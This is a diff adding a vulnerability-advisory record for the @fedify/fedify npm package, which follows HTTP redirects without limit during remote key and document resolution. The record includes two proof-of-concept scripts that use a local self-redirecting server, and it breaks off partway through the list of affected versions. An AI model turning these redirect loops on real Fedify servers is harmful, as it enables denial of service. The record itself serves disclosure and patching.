@@ -1,0 +1,1332 @@
+advisory_id: GHSA-gm9m-gwc4-hwgp
+datasource_id: github_osv/GHSA-gm9m-gwc4-hwgp
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-gm9m-gwc4-hwgp/GHSA-gm9m-gwc4-hwgp.json
+aliases:
+  - CVE-2026-34148
+summary: |
+  Fedify affected by resource exhaustion caused by unbounded redirect following during remote key/document resolution
+  ### Summary
+
+  `@fedify/fedify` follows HTTP redirects recursively in its remote document loader and authenticated document loader without enforcing a maximum redirect count or visited-URL loop detection. An attacker who controls a remote ActivityPub key or actor URL can force a server using Fedify to make repeated outbound requests from a single inbound request, leading to resource consumption and denial of service.
+
+  ### Details
+
+  Fedify verifies ActivityPub HTTP signatures by fetching the remote `keyId` during request processing. The relevant flow is `handleInboxInternal()` -> `verifyRequest()` -> `fetchKeyInternal()` -> document loader.
+
+  In affected versions:
+  - the generic document loader recursively follows `3xx` responses by calling `load()` again on the `Location` header
+  - the authenticated redirect path (`doubleKnock()`) also recursively follows redirects
+  - neither path enforces a redirect cap or tracks visited URLs to detect self-referential redirect loops
+
+  As a result, if an attacker-controlled `keyId` or actor URL responds with `302 Location: <same URL>`, a single ActivityPub request can trigger tens or hundreds of outbound requests before the fetch completes or the request times out.
+
+  I confirmed the issue in `@fedify/fedify` 1.9.1 and 1.9.2. By contrast, Fedify's WebFinger lookup path already has a redirect cap, which suggests the missing bound in the document loader is unintended.
+
+  Failed key fetches are not durably negatively cached. After a failed lookup, the null result is only remembered in a request-local cache, so later requests can trigger the same redirect loop again for the same `keyId`.
+
+  ### PoC
+
+  Minimal direct reproduction with the package:
+
+  1. Install `@fedify/fedify@1.9.2`.
+  2. Save and run the following script:
+
+  ```js
+  import http from "node:http";
+  import { getDocumentLoader } from "@fedify/fedify";
+
+  const port = 45679;
+  let count = 0;
+  const redirectCount = 120;
+
+  const server = http.createServer((req, res) => {
+    count += 1;
+
+    if (count < redirectCount) {
+      res.writeHead(302, {
+        Location: `http://127.0.0.1:${port}/actor`,
+      });
+      res.end();
+      return;
+    }
+
+    res.writeHead(200, { "Content-Type": "application/activity+json" });
+    res.end(JSON.stringify({
+      "@context": "https://www.w3.org/ns/activitystreams",
+      "id": `http://127.0.0.1:${port}/actor`,
+      "type": "Person"
+    }));
+  });
+
+  await new Promise((resolve) => server.listen(port, "127.0.0.1", resolve));
+
+  try {
+    const loader = getDocumentLoader({ allowPrivateAddress: true });
+    await loader(`http://127.0.0.1:${port}/actor`);
+    console.log({ count });
+  } finally {
+    server.close();
+  }
+  ```
+
+  3. Observe output similar to:
+
+  ```
+  { count: 120 }
+  ```
+
+  This shows the loader followed 119 self-redirects before the first non-redirect response.
+
+  The authenticated loader used for signed requests shows the same behavior:
+
+  ```
+  import http from "node:http";
+  import {
+    generateCryptoKeyPair,
+    getAuthenticatedDocumentLoader,
+  } from "@fedify/fedify";
+
+  const port = 45680;
+  let count = 0;
+  const redirectCount = 120;
+
+  const server = http.createServer((req, res) => {
+    count += 1;
+
+    if (count < redirectCount) {
+      res.writeHead(302, {
+        Location: `http://127.0.0.1:${port}/actor`,
+      });
+      res.end();
+      return;
+    }
+
+    res.writeHead(200, { "Content-Type": "application/activity+json" });
+    res.end(JSON.stringify({
+      "@context": "https://www.w3.org/ns/activitystreams",
+      "id": `http://127.0.0.1:${port}/actor`,
+      "type": "Person"
+    }));
+  });
+
+  await new Promise((resolve) => server.listen(port, "127.0.0.1", resolve));
+
+  try {
+    const { privateKey } = await generateCryptoKeyPair();
+    const loader = getAuthenticatedDocumentLoader(
+      {
+        privateKey,
+        keyId: new URL("https://example.com/users/index#main-key"),
+      },
+      { allowPrivateAddress: true },
+    );
+
+    await loader(`http://127.0.0.1:${port}/actor`);
+    console.log({ count });
+  } finally {
+    server.close();
+  }
+  ```
+
+  ### Impact
+
+  This is an unauthenticated denial-of-service / request amplification issue. Any Fedify-based server that verifies remote keys or loads remote ActivityPub documents can be forced to spend CPU time, worker time, connection slots, and outbound bandwidth following attacker-controlled redirects. A single inbound request can trigger a large number of outbound requests, and the attack can be repeated across requests because failed lookups are not durably negatively cached.
+
+  ### Misc Notes
+
+  This issue was surfaced by a Ghost ActivityPub user reporting the issue directly to Ghost. The above report was generated upon further investigation into the issue by the Ghost team. We credit @wrathsec for the discovery.
+impacted_packages:
+  - purl: pkg:npm/%40fedify/fedify
+    affected_versions: vers:npm/<1.9.6
+    fixed_versions: vers:npm/1.9.6
+    affected_packages:
+      - pkg:npm/%40fedify/fedify@0.5.0-dev.88
+      - pkg:npm/%40fedify/fedify@0.5.0-dev.90
+      - pkg:npm/%40fedify/fedify@0.5.0-dev.92
+      - pkg:npm/%40fedify/fedify@0.5.0-dev.93
+      - pkg:npm/%40fedify/fedify@0.5.0-dev.94
+      - pkg:npm/%40fedify/fedify@0.5.0-dev.95
+      - pkg:npm/%40fedify/fedify@0.5.0-dev.96
+      - pkg:npm/%40fedify/fedify@0.5.0-dev.97
+      - pkg:npm/%40fedify/fedify@0.5.0-dev.98
+      - pkg:npm/%40fedify/fedify@0.5.0-dev.99
+      - pkg:npm/%40fedify/fedify@0.5.0
+      - pkg:npm/%40fedify/fedify@0.5.1-dev.108
+      - pkg:npm/%40fedify/fedify@0.5.1
+      - pkg:npm/%40fedify/fedify@0.5.2
+      - pkg:npm/%40fedify/fedify@0.6.0-dev.101
+      - pkg:npm/%40fedify/fedify@0.6.0-dev.102
+      - pkg:npm/%40fedify/fedify@0.6.0-dev.103
+      - pkg:npm/%40fedify/fedify@0.6.0-dev.104
+      - pkg:npm/%40fedify/fedify@0.6.0-dev.105
+      - pkg:npm/%40fedify/fedify@0.6.0-dev.106
+      - pkg:npm/%40fedify/fedify@0.6.0-dev.107
+      - pkg:npm/%40fedify/fedify@0.6.0-dev.110
+      - pkg:npm/%40fedify/fedify@0.6.0-dev.111
+      - pkg:npm/%40fedify/fedify@0.6.0-dev.112
+      - pkg:npm/%40fedify/fedify@0.6.0-dev.113
+      - pkg:npm/%40fedify/fedify@0.6.0
+      - pkg:npm/%40fedify/fedify@0.6.1
+      - pkg:npm/%40fedify/fedify@0.7.0-dev.116
+      - pkg:npm/%40fedify/fedify@0.7.0-dev.117
+      - pkg:npm/%40fedify/fedify@0.7.0-dev.118
+      - pkg:npm/%40fedify/fedify@0.7.0-dev.119
+      - pkg:npm/%40fedify/fedify@0.7.0-dev.120
+      - pkg:npm/%40fedify/fedify@0.7.0-dev.123
+      - pkg:npm/%40fedify/fedify@0.7.0-dev.128
+      - pkg:npm/%40fedify/fedify@0.7.0-dev.129
+      - pkg:npm/%40fedify/fedify@0.7.0-dev.130
+      - pkg:npm/%40fedify/fedify@0.7.0-dev.131
+      - pkg:npm/%40fedify/fedify@0.7.0-dev.132
+      - pkg:npm/%40fedify/fedify@0.7.0-dev.133
+      - pkg:npm/%40fedify/fedify@0.7.0-dev.134
+      - pkg:npm/%40fedify/fedify@0.7.0-dev.135
+      - pkg:npm/%40fedify/fedify@0.7.0
+      - pkg:npm/%40fedify/fedify@0.8.0-dev.139
+      - pkg:npm/%40fedify/fedify@0.8.0-dev.140
+      - pkg:npm/%40fedify/fedify@0.8.0-dev.142
+      - pkg:npm/%40fedify/fedify@0.8.0-dev.144
+      - pkg:npm/%40fedify/fedify@0.8.0-dev.148
+      - pkg:npm/%40fedify/fedify@0.8.0-dev.149
+      - pkg:npm/%40fedify/fedify@0.8.0-dev.150
+      - pkg:npm/%40fedify/fedify@0.8.0-dev.151
+      - pkg:npm/%40fedify/fedify@0.8.0-dev.152
+      - pkg:npm/%40fedify/fedify@0.8.0-dev.153
+      - pkg:npm/%40fedify/fedify@0.8.0-dev.154
+      - pkg:npm/%40fedify/fedify@0.8.0-dev.156
+      - pkg:npm/%40fedify/fedify@0.8.0-dev.162
+      - pkg:npm/%40fedify/fedify@0.8.0-dev.163
+      - pkg:npm/%40fedify/fedify@0.8.0-dev.164
+      - pkg:npm/%40fedify/fedify@0.8.0-dev.166
+      - pkg:npm/%40fedify/fedify@0.8.0-dev.167
+      - pkg:npm/%40fedify/fedify@0.8.0-dev.168
+      - pkg:npm/%40fedify/fedify@0.8.0
+      - pkg:npm/%40fedify/fedify@0.9.0-dev.170
+      - pkg:npm/%40fedify/fedify@0.9.0-dev.171
+      - pkg:npm/%40fedify/fedify@0.9.0-dev.172
+      - pkg:npm/%40fedify/fedify@0.9.0-dev.173
+      - pkg:npm/%40fedify/fedify@0.9.0-dev.174
+      - pkg:npm/%40fedify/fedify@0.9.0-dev.175
+      - pkg:npm/%40fedify/fedify@0.9.0-dev.176
+      - pkg:npm/%40fedify/fedify@0.9.0-dev.177
+      - pkg:npm/%40fedify/fedify@0.9.0-dev.179
+      - pkg:npm/%40fedify/fedify@0.9.0-dev.181
+      - pkg:npm/%40fedify/fedify@0.9.0-dev.182
+      - pkg:npm/%40fedify/fedify@0.9.0-dev.183
+      - pkg:npm/%40fedify/fedify@0.9.0-dev.184
+      - pkg:npm/%40fedify/fedify@0.9.0
+      - pkg:npm/%40fedify/fedify@0.9.1
+      - pkg:npm/%40fedify/fedify@0.9.2
+      - pkg:npm/%40fedify/fedify@0.9.3
+      - pkg:npm/%40fedify/fedify@0.10.0-dev.186
+      - pkg:npm/%40fedify/fedify@0.10.0-dev.187
+      - pkg:npm/%40fedify/fedify@0.10.0-dev.190
+      - pkg:npm/%40fedify/fedify@0.10.0-dev.194
+      - pkg:npm/%40fedify/fedify@0.10.0-dev.195
+      - pkg:npm/%40fedify/fedify@0.10.0-dev.196
+      - pkg:npm/%40fedify/fedify@0.10.0-dev.197
+      - pkg:npm/%40fedify/fedify@0.10.0-dev.198
+      - pkg:npm/%40fedify/fedify@0.10.0-dev.199
+      - pkg:npm/%40fedify/fedify@0.10.0-dev.200
+      - pkg:npm/%40fedify/fedify@0.10.0-dev.202
+      - pkg:npm/%40fedify/fedify@0.10.0-dev.203
+      - pkg:npm/%40fedify/fedify@0.10.0-dev.204
+      - pkg:npm/%40fedify/fedify@0.10.0-dev.205
+      - pkg:npm/%40fedify/fedify@0.10.0-dev.206
+      - pkg:npm/%40fedify/fedify@0.10.0-dev.207
+      - pkg:npm/%40fedify/fedify@0.10.0-dev.209
+      - pkg:npm/%40fedify/fedify@0.10.0-dev.211
+      - pkg:npm/%40fedify/fedify@0.10.0-dev.212
+      - pkg:npm/%40fedify/fedify@0.10.0-dev.213
+      - pkg:npm/%40fedify/fedify@0.10.0-dev.218
+      - pkg:npm/%40fedify/fedify@0.10.0-dev.219
+      - pkg:npm/%40fedify/fedify@0.10.0-dev.220
+      - pkg:npm/%40fedify/fedify@0.10.0-dev.221
+      - pkg:npm/%40fedify/fedify@0.10.0
+      - pkg:npm/%40fedify/fedify@0.10.1
+      - pkg:npm/%40fedify/fedify@0.10.2
+      - pkg:npm/%40fedify/fedify@0.11.0-dev.223
+      - pkg:npm/%40fedify/fedify@0.11.0-dev.228
+      - pkg:npm/%40fedify/fedify@0.11.0-dev.229
+      - pkg:npm/%40fedify/fedify@0.11.0-dev.231
+      - pkg:npm/%40fedify/fedify@0.11.0-dev.234
+      - pkg:npm/%40fedify/fedify@0.11.0-dev.235
+      - pkg:npm/%40fedify/fedify@0.11.0-dev.236
+      - pkg:npm/%40fedify/fedify@0.11.0-dev.237
+      - pkg:npm/%40fedify/fedify@0.11.0-dev.238
+      - pkg:npm/%40fedify/fedify@0.11.0-dev.239
+      - pkg:npm/%40fedify/fedify@0.11.0-dev.240
+      - pkg:npm/%40fedify/fedify@0.11.0-dev.241
+      - pkg:npm/%40fedify/fedify@0.11.0-dev.242
+      - pkg:npm/%40fedify/fedify@0.11.0-dev.243
+      - pkg:npm/%40fedify/fedify@0.11.0-dev.244
+      - pkg:npm/%40fedify/fedify@0.11.0-dev.245
+      - pkg:npm/%40fedify/fedify@0.11.0-dev.250
+      - pkg:npm/%40fedify/fedify@0.11.0-dev.251
+      - pkg:npm/%40fedify/fedify@0.11.0-dev.252
+      - pkg:npm/%40fedify/fedify@0.11.0-dev.253
+      - pkg:npm/%40fedify/fedify@0.11.0-dev.254
+      - pkg:npm/%40fedify/fedify@0.11.0-dev.255
+      - pkg:npm/%40fedify/fedify@0.11.0-dev.256
+      - pkg:npm/%40fedify/fedify@0.11.0-dev.257
+      - pkg:npm/%40fedify/fedify@0.11.0-dev.258
+      - pkg:npm/%40fedify/fedify@0.11.0-dev.259
+      - pkg:npm/%40fedify/fedify@0.11.0-dev.260
+      - pkg:npm/%40fedify/fedify@0.11.0
+      - pkg:npm/%40fedify/fedify@0.11.1
+      - pkg:npm/%40fedify/fedify@0.11.2
+      - pkg:npm/%40fedify/fedify@0.11.3
+      - pkg:npm/%40fedify/fedify@0.12.0-dev.262
+      - pkg:npm/%40fedify/fedify@0.12.0-dev.263
+      - pkg:npm/%40fedify/fedify@0.12.0-dev.265
+      - pkg:npm/%40fedify/fedify@0.12.0-dev.266
+      - pkg:npm/%40fedify/fedify@0.12.0-dev.267
+      - pkg:npm/%40fedify/fedify@0.12.0-dev.268
+      - pkg:npm/%40fedify/fedify@0.12.0-dev.273
+      - pkg:npm/%40fedify/fedify@0.12.0-dev.276
+      - pkg:npm/%40fedify/fedify@0.12.0-dev.278
+      - pkg:npm/%40fedify/fedify@0.12.0-dev.282
+      - pkg:npm/%40fedify/fedify@0.12.0-dev.283
+      - pkg:npm/%40fedify/fedify@0.12.0-dev.284
+      - pkg:npm/%40fedify/fedify@0.12.0-dev.285
+      - pkg:npm/%40fedify/fedify@0.12.0-dev.286
+      - pkg:npm/%40fedify/fedify@0.12.0-dev.287
+      - pkg:npm/%40fedify/fedify@0.12.0-dev.288
+      - pkg:npm/%40fedify/fedify@0.12.0-dev.291
+      - pkg:npm/%40fedify/fedify@0.12.0-dev.298
+      - pkg:npm/%40fedify/fedify@0.12.0-dev.299
+      - pkg:npm/%40fedify/fedify@0.12.0-dev.300
+      - pkg:npm/%40fedify/fedify@0.12.0-dev.301
+      - pkg:npm/%40fedify/fedify@0.12.0-dev.302
+      - pkg:npm/%40fedify/fedify@0.12.0-dev.304
+      - pkg:npm/%40fedify/fedify@0.12.0-dev.305
+      - pkg:npm/%40fedify/fedify@0.12.0-dev.307
+      - pkg:npm/%40fedify/fedify@0.12.0-dev.308
+      - pkg:npm/%40fedify/fedify@0.12.0
+      - pkg:npm/%40fedify/fedify@0.12.1
+      - pkg:npm/%40fedify/fedify@0.12.2
+      - pkg:npm/%40fedify/fedify@0.12.3
+      - pkg:npm/%40fedify/fedify@0.13.0-dev.310
+      - pkg:npm/%40fedify/fedify@0.13.0-dev.311
+      - pkg:npm/%40fedify/fedify@0.13.0-dev.312
+      - pkg:npm/%40fedify/fedify@0.13.0-dev.313
+      - pkg:npm/%40fedify/fedify@0.13.0-dev.315
+      - pkg:npm/%40fedify/fedify@0.13.0-dev.316
+      - pkg:npm/%40fedify/fedify@0.13.0-dev.318
+      - pkg:npm/%40fedify/fedify@0.13.0-dev.319
+      - pkg:npm/%40fedify/fedify@0.13.0-dev.320
+      - pkg:npm/%40fedify/fedify@0.13.0-dev.321
+      - pkg:npm/%40fedify/fedify@0.13.0-dev.322
+      - pkg:npm/%40fedify/fedify@0.13.0-dev.323
+      - pkg:npm/%40fedify/fedify@0.13.0-dev.324
+      - pkg:npm/%40fedify/fedify@0.13.0
+      - pkg:npm/%40fedify/fedify@0.13.1
+      - pkg:npm/%40fedify/fedify@0.13.2
+      - pkg:npm/%40fedify/fedify@0.13.3
+      - pkg:npm/%40fedify/fedify@0.13.4
+      - pkg:npm/%40fedify/fedify@0.13.5
+      - pkg:npm/%40fedify/fedify@0.14.0-dev.326
+      - pkg:npm/%40fedify/fedify@0.14.0-dev.327
+      - pkg:npm/%40fedify/fedify@0.14.0-dev.328
+      - pkg:npm/%40fedify/fedify@0.14.0-dev.331
+      - pkg:npm/%40fedify/fedify@0.14.0-dev.332
+      - pkg:npm/%40fedify/fedify@0.14.0-dev.333
+      - pkg:npm/%40fedify/fedify@0.14.0-dev.334
+      - pkg:npm/%40fedify/fedify@0.14.0-dev.335
+      - pkg:npm/%40fedify/fedify@0.14.0-dev.336
+      - pkg:npm/%40fedify/fedify@0.14.0-dev.337
+      - pkg:npm/%40fedify/fedify@0.14.0-dev.338
+      - pkg:npm/%40fedify/fedify@0.14.0-dev.339
+      - pkg:npm/%40fedify/fedify@0.14.0-dev.344
+      - pkg:npm/%40fedify/fedify@0.14.0-dev.345
+      - pkg:npm/%40fedify/fedify@0.14.0-dev.351
+      - pkg:npm/%40fedify/fedify@0.14.0
+      - pkg:npm/%40fedify/fedify@0.14.1
+      - pkg:npm/%40fedify/fedify@0.14.2
+      - pkg:npm/%40fedify/fedify@0.14.3
+      - pkg:npm/%40fedify/fedify@0.14.4
+      - pkg:npm/%40fedify/fedify@0.14.5
+      - pkg:npm/%40fedify/fedify@0.15.0-dev.354
+      - pkg:npm/%40fedify/fedify@0.15.0-dev.359
+      - pkg:npm/%40fedify/fedify@0.15.0-dev.362
+      - pkg:npm/%40fedify/fedify@0.15.0-dev.367
+      - pkg:npm/%40fedify/fedify@0.15.0-dev.372
+      - pkg:npm/%40fedify/fedify@0.15.0-dev.374
+      - pkg:npm/%40fedify/fedify@0.15.0-dev.375
+      - pkg:npm/%40fedify/fedify@0.15.0-dev.376
+      - pkg:npm/%40fedify/fedify@0.15.0-dev.377
+      - pkg:npm/%40fedify/fedify@0.15.0-dev.378
+      - pkg:npm/%40fedify/fedify@0.15.0-dev.381
+      - pkg:npm/%40fedify/fedify@0.15.0-dev.382
+      - pkg:npm/%40fedify/fedify@0.15.0-dev.383
+      - pkg:npm/%40fedify/fedify@0.15.0-dev.384
+      - pkg:npm/%40fedify/fedify@0.15.0
+      - pkg:npm/%40fedify/fedify@0.15.1
+      - pkg:npm/%40fedify/fedify@0.15.2
+      - pkg:npm/%40fedify/fedify@0.15.3
+      - pkg:npm/%40fedify/fedify@0.15.4
+      - pkg:npm/%40fedify/fedify@0.15.5
+      - pkg:npm/%40fedify/fedify@0.15.6
+      - pkg:npm/%40fedify/fedify@0.15.7
+      - pkg:npm/%40fedify/fedify@0.15.8
+      - pkg:npm/%40fedify/fedify@0.15.9
+      - pkg:npm/%40fedify/fedify@1.0.0-dev.386
+      - pkg:npm/%40fedify/fedify@1.0.0-dev.388
+      - pkg:npm/%40fedify/fedify@1.0.0-dev.391
+      - pkg:npm/%40fedify/fedify@1.0.0-dev.395
+      - pkg:npm/%40fedify/fedify@1.0.0-dev.396
+      - pkg:npm/%40fedify/fedify@1.0.0-dev.397
+      - pkg:npm/%40fedify/fedify@1.0.0-dev.398
+      - pkg:npm/%40fedify/fedify@1.0.0-dev.399
+      - pkg:npm/%40fedify/fedify@1.0.0-dev.400
+      - pkg:npm/%40fedify/fedify@1.0.0-dev.402
+      - pkg:npm/%40fedify/fedify@1.0.0-dev.404
+      - pkg:npm/%40fedify/fedify@1.0.0-dev.405
+      - pkg:npm/%40fedify/fedify@1.0.0-dev.407
+      - pkg:npm/%40fedify/fedify@1.0.0-dev.408
+      - pkg:npm/%40fedify/fedify@1.0.0-dev.409
+      - pkg:npm/%40fedify/fedify@1.0.0-dev.410
+      - pkg:npm/%40fedify/fedify@1.0.0-dev.411
+      - pkg:npm/%40fedify/fedify@1.0.0-dev.412
+      - pkg:npm/%40fedify/fedify@1.0.0-dev.413
+      - pkg:npm/%40fedify/fedify@1.0.0-dev.414
+      - pkg:npm/%40fedify/fedify@1.0.0-dev.415
+      - pkg:npm/%40fedify/fedify@1.0.0-dev.416
+      - pkg:npm/%40fedify/fedify@1.0.0
+      - pkg:npm/%40fedify/fedify@1.0.1
+      - pkg:npm/%40fedify/fedify@1.0.2
+      - pkg:npm/%40fedify/fedify@1.0.3
+      - pkg:npm/%40fedify/fedify@1.0.4
+      - pkg:npm/%40fedify/fedify@1.0.5
+      - pkg:npm/%40fedify/fedify@1.0.6
+      - pkg:npm/%40fedify/fedify@1.0.7
+      - pkg:npm/%40fedify/fedify@1.0.8
+      - pkg:npm/%40fedify/fedify@1.0.9
+      - pkg:npm/%40fedify/fedify@1.0.10
+      - pkg:npm/%40fedify/fedify@1.0.11
+      - pkg:npm/%40fedify/fedify@1.0.12
+      - pkg:npm/%40fedify/fedify@1.0.13
+      - pkg:npm/%40fedify/fedify@1.0.14
+      - pkg:npm/%40fedify/fedify@1.0.15
+      - pkg:npm/%40fedify/fedify@1.0.16
+      - pkg:npm/%40fedify/fedify@1.0.17
+      - pkg:npm/%40fedify/fedify@1.0.18
+      - pkg:npm/%40fedify/fedify@1.0.19
+      - pkg:npm/%40fedify/fedify@1.0.20
+      - pkg:npm/%40fedify/fedify@1.0.21
+      - pkg:npm/%40fedify/fedify@1.0.22
+      - pkg:npm/%40fedify/fedify@1.0.23
+      - pkg:npm/%40fedify/fedify@1.0.24
+      - pkg:npm/%40fedify/fedify@1.0.25
+      - pkg:npm/%40fedify/fedify@1.0.26
+      - pkg:npm/%40fedify/fedify@1.0.27
+      - pkg:npm/%40fedify/fedify@1.0.28
+      - pkg:npm/%40fedify/fedify@1.0.29
+      - pkg:npm/%40fedify/fedify@1.0.30
+      - pkg:npm/%40fedify/fedify@1.1.0-dev.421
+      - pkg:npm/%40fedify/fedify@1.1.0-dev.423
+      - pkg:npm/%40fedify/fedify@1.1.0-dev.427
+      - pkg:npm/%40fedify/fedify@1.1.0-dev.428
+      - pkg:npm/%40fedify/fedify@1.1.0-dev.429
+      - pkg:npm/%40fedify/fedify@1.1.0-dev.431
+      - pkg:npm/%40fedify/fedify@1.1.0-dev.432
+      - pkg:npm/%40fedify/fedify@1.1.0-dev.433
+      - pkg:npm/%40fedify/fedify@1.1.0-dev.434
+      - pkg:npm/%40fedify/fedify@1.1.0-dev.438
+      - pkg:npm/%40fedify/fedify@1.1.0-dev.439
+      - pkg:npm/%40fedify/fedify@1.1.0-dev.440
+      - pkg:npm/%40fedify/fedify@1.1.0-dev.441
+      - pkg:npm/%40fedify/fedify@1.1.0-dev.442
+      - pkg:npm/%40fedify/fedify@1.1.0-dev.444
+      - pkg:npm/%40fedify/fedify@1.1.0-dev.446
+      - pkg:npm/%40fedify/fedify@1.1.0-dev.447
+      - pkg:npm/%40fedify/fedify@1.1.0
+      - pkg:npm/%40fedify/fedify@1.1.1
+      - pkg:npm/%40fedify/fedify@1.1.2
+      - pkg:npm/%40fedify/fedify@1.1.3
+      - pkg:npm/%40fedify/fedify@1.1.4
+      - pkg:npm/%40fedify/fedify@1.1.5
+      - pkg:npm/%40fedify/fedify@1.1.6
+      - pkg:npm/%40fedify/fedify@1.1.7
+      - pkg:npm/%40fedify/fedify@1.1.8
+      - pkg:npm/%40fedify/fedify@1.1.9
+      - pkg:npm/%40fedify/fedify@1.1.10
+      - pkg:npm/%40fedify/fedify@1.1.11
+      - pkg:npm/%40fedify/fedify@1.1.12
+      - pkg:npm/%40fedify/fedify@1.1.13
+      - pkg:npm/%40fedify/fedify@1.1.14
+      - pkg:npm/%40fedify/fedify@1.1.15
+      - pkg:npm/%40fedify/fedify@1.1.16
+      - pkg:npm/%40fedify/fedify@1.1.17
+      - pkg:npm/%40fedify/fedify@1.1.18
+      - pkg:npm/%40fedify/fedify@1.1.19
+      - pkg:npm/%40fedify/fedify@1.1.20
+      - pkg:npm/%40fedify/fedify@1.1.21
+      - pkg:npm/%40fedify/fedify@1.1.22
+      - pkg:npm/%40fedify/fedify@1.1.23
+      - pkg:npm/%40fedify/fedify@1.1.24
+      - pkg:npm/%40fedify/fedify@1.1.25
+      - pkg:npm/%40fedify/fedify@1.1.26
+      - pkg:npm/%40fedify/fedify@1.1.27
+      - pkg:npm/%40fedify/fedify@1.2.0-dev.450
+      - pkg:npm/%40fedify/fedify@1.2.0-dev.452
+      - pkg:npm/%40fedify/fedify@1.2.0-dev.456
+      - pkg:npm/%40fedify/fedify@1.2.0-dev.462
+      - pkg:npm/%40fedify/fedify@1.2.0-dev.463
+      - pkg:npm/%40fedify/fedify@1.2.0-dev.464
+      - pkg:npm/%40fedify/fedify@1.2.0-dev.466
+      - pkg:npm/%40fedify/fedify@1.2.0-dev.467
+      - pkg:npm/%40fedify/fedify@1.2.0-dev.468
+      - pkg:npm/%40fedify/fedify@1.2.0-dev.472
+      - pkg:npm/%40fedify/fedify@1.2.0-dev.473
+      - pkg:npm/%40fedify/fedify@1.2.0
+      - pkg:npm/%40fedify/fedify@1.2.1
+      - pkg:npm/%40fedify/fedify@1.2.2
+      - pkg:npm/%40fedify/fedify@1.2.3
+      - pkg:npm/%40fedify/fedify@1.2.4
+      - pkg:npm/%40fedify/fedify@1.2.5
+      - pkg:npm/%40fedify/fedify@1.2.6
+      - pkg:npm/%40fedify/fedify@1.2.7
+      - pkg:npm/%40fedify/fedify@1.2.8
+      - pkg:npm/%40fedify/fedify@1.2.9
+      - pkg:npm/%40fedify/fedify@1.2.10
+      - pkg:npm/%40fedify/fedify@1.2.11
+      - pkg:npm/%40fedify/fedify@1.2.12
+      - pkg:npm/%40fedify/fedify@1.2.13
+      - pkg:npm/%40fedify/fedify@1.2.14
+      - pkg:npm/%40fedify/fedify@1.2.15
+      - pkg:npm/%40fedify/fedify@1.2.16
+      - pkg:npm/%40fedify/fedify@1.2.17
+      - pkg:npm/%40fedify/fedify@1.2.18
+      - pkg:npm/%40fedify/fedify@1.2.19
+      - pkg:npm/%40fedify/fedify@1.2.20
+      - pkg:npm/%40fedify/fedify@1.2.21
+      - pkg:npm/%40fedify/fedify@1.2.22
+      - pkg:npm/%40fedify/fedify@1.2.23
+      - pkg:npm/%40fedify/fedify@1.2.24
+      - pkg:npm/%40fedify/fedify@1.2.25
+      - pkg:npm/%40fedify/fedify@1.2.26
+      - pkg:npm/%40fedify/fedify@1.2.27
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.477
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.480
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.481
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.482
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.484
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.485
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.487
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.492
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.502
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.507
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.508
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.509
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.510
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.511
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.512
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.513
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.514
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.519
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.522
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.524
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.531
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.532
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.547
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.552
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.553
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.557
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.563
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.564
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.565
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.568
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.569
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.570
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.571
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.575
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.576
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.577
+      - pkg:npm/%40fedify/fedify@1.3.0-dev.578
+      - pkg:npm/%40fedify/fedify@1.3.0
+      - pkg:npm/%40fedify/fedify@1.3.1
+      - pkg:npm/%40fedify/fedify@1.3.2
+      - pkg:npm/%40fedify/fedify@1.3.3
+      - pkg:npm/%40fedify/fedify@1.3.4
+      - pkg:npm/%40fedify/fedify@1.3.5
+      - pkg:npm/%40fedify/fedify@1.3.6
+      - pkg:npm/%40fedify/fedify@1.3.7
+      - pkg:npm/%40fedify/fedify@1.3.8
+      - pkg:npm/%40fedify/fedify@1.3.9
+      - pkg:npm/%40fedify/fedify@1.3.10
+      - pkg:npm/%40fedify/fedify@1.3.11
+      - pkg:npm/%40fedify/fedify@1.3.12
+      - pkg:npm/%40fedify/fedify@1.3.13
+      - pkg:npm/%40fedify/fedify@1.3.14
+      - pkg:npm/%40fedify/fedify@1.3.15
+      - pkg:npm/%40fedify/fedify@1.3.16
+      - pkg:npm/%40fedify/fedify@1.3.17
+      - pkg:npm/%40fedify/fedify@1.3.18
+      - pkg:npm/%40fedify/fedify@1.3.19
+      - pkg:npm/%40fedify/fedify@1.3.20
+      - pkg:npm/%40fedify/fedify@1.3.21
+      - pkg:npm/%40fedify/fedify@1.3.22
+      - pkg:npm/%40fedify/fedify@1.3.23
+      - pkg:npm/%40fedify/fedify@1.3.24
+      - pkg:npm/%40fedify/fedify@1.4.0-dev.585
+      - pkg:npm/%40fedify/fedify@1.4.0-dev.586
+      - pkg:npm/%40fedify/fedify@1.4.0-dev.587
+      - pkg:npm/%40fedify/fedify@1.4.0-dev.592
+      - pkg:npm/%40fedify/fedify@1.4.0-dev.593
+      - pkg:npm/%40fedify/fedify@1.4.0-dev.594
